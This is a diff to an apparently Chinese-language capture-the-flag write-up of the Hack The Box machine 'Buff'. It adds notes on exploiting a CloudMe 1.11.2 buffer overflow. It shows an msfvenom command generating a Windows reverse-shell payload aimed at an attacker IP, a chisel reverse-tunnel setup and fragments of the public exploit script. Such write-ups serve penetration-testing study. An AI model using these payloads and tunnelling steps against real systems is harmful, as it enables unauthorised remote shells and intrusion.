@@ -1,4 +1,10 @@
 ## Buff
+#### 提示里的:#msfvenom -a x86 -p windows/exec CMD=calc.exe -b '\x00\x0A\x0D' -f python
+
+#### 操作命令:msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.14.134 LPORT=443 -b '\x00\x0A\x0D' -f python -v payload
+### 方法一：https://www.exploit-db.com/exploits/48389 ：CloudMe 1.11.2 - Buffer Overflow (PoC)
+### 方法二：[★]$ searchsploit cloudme
+![图片](image/2026020602.png)
 ```
 [★]$ nmap -sC -sV 10.129.2.18
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-05 03:10 CST
@@ -406,7 +412,7 @@ dir
 
 14/07/2020  12:27    <DIR>          .
 14/07/2020  12:27    <DIR>          ..
-16/06/2020  15:26        17,830,824 CloudMe_1112.exe
+16/06/2020  15:26        17,830,824 CloudMe_1112.exe //二进制文件监听的是本地主机上的是8888端口
                1 File(s)     17,830,824 bytes
                2 Dir(s)   7,832,453,120 bytes free
 
@@ -435,7 +441,7 @@ Shellcodes: No Results
 ```
 #### 为了利用这个服务，我需要一条从我的机器到Buff的隧道（或者我必须从Buff运行这个漏洞，但是Python通常不安装在Windows上）。我会用我最喜欢的工具，凿子。我将使用相同的SMB共享并将Windows二进制文件复制到我在\programdata中暂存的位置。
 https://www.exploit-db.com/exploits/48389
-#### 在线搜索“Cloud Me”版本1112返回这个exploit - db漏洞。检查显示这是一个缓冲区溢出漏洞（参见附录a的代码清单）。当服务在本地主机上侦听时，我们可以使用SOCKS使这个端口对我们的机器可用代理。要做到这一点，我们可以使用凿子。首先，Chisel
+#### 在线搜索“CloudMe”版本1.11.2返回这个exploit-db漏洞。检查显示这是一个缓冲区溢出漏洞（参见附录a的代码清单）。当服务在本地主机上侦听时，我们可以使用SOCKS使这个端口对我们的机器可用代理。要做到这一点，我们可以使用凿子。首先，Chisel
 https://github.com/jpillora/chisel
 在https://github.com/jpillora/chisel/releases下载chisel_1.6.0_windows_amd64
 ```
@@ -490,7 +496,7 @@ chisel_1.6.0_windows_amd64.exe
 ```
 [★]$ gunzip chisel_1.6.0_linux_amd64.gz
 [★]$ chmod 777 chisel_1.6.0_linux_amd64
- [★]$ ./chisel_1.6.0_linux_amd64 server -p 8000 --reverse
+[★]$ ./chisel_1.6.0_linux_amd64 server -p 8000 --reverse
 2026/02/06 09:29:56 server: Reverse tunnelling enabled
 2026/02/06 09:29:56 server: Fingerprint f5:ac:52:72:f2:de:3b:1a:09:b2:d0:65:cb:6b:5c:03
 2026/02/06 09:29:56 server: Listening on 0.0.0.0:8000...
@@ -532,16 +538,17 @@ tcp6       0      0 :::111                  :::*                    LISTEN
 ```
 ### Update Exploit
 #### 非常简单，它在端口8888上打开一个到目标的连接，发送一个缓冲区，就完成了。
-#### 缓冲区由1052字节的no-op （nop，填充）组成，然后是一个push esp， ret gadget的地址，一些nops，有效负载，然后是一些填充。
+#### 缓冲区由1052字节的no-op(nop，padding填充)组成，然后是一个push esp,ret gadget的地址，一些nops，有效负载，然后是一些填充。
 #### 在不查看二进制文件的情况下，这表明读取用户输入前后的堆栈是这样的：
 ![图片](image/2026020601.png)
 ```
-[★]$ searchsploit cloudme
+[★]$ searchsploit cloudme //CloudMe_1.11.2.exe //二进制文件监听的是本地主机上的是8888端口
 ------------------------------------------------------------- ---------------------------------
  Exploit Title                                               |  Path
 ------------------------------------------------------------- ---------------------------------
 CloudMe 1.11.2 - Buffer Overflow (PoC)                       | windows/remote/48389.py
-[★]$ searchsploit -m windows/remote/48389.py
+
+[★]$ searchsploit -m windows/remote/48389.py 
   Exploit: CloudMe 1.11.2 - Buffer Overflow (PoC)
       URL: https://www.exploit-db.com/exploits/48389
      Path: /usr/share/exploitdb/exploits/windows/remote/48389.py
@@ -599,7 +606,7 @@ buf = padding1 + EIP + NOPS + payload + overrun
 
 try:
         s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((target,8888))
+        s.connect((target,8888))  //从这里看CloudMe_1112.exe,二进制文件监听的是本地主机上的是8888端口
         s.send(buf)
 except Exception as e:
         print(sys.exc_value)
